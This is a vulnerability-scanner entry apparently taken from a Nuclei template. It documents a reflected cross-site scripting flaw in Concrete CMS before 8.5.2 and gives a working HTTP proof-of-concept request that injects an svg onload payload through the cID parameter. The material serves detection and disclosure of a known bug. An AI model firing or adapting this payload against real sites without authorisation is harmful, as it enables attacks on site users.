# Nuclei Template: Concrete CMS <8.5.2 - Cross-Site Scripting
**Template ID:** concrete-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`concrete-xss.yaml`)

## Vulnerability Information & PoC

## Description
Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>
```

## References
- https://hackerone.com/reports/643442
- https://github.com/concrete5/concrete5/pull/7999
- https://twitter.com/JacksonHHax/status/1389222207805661187
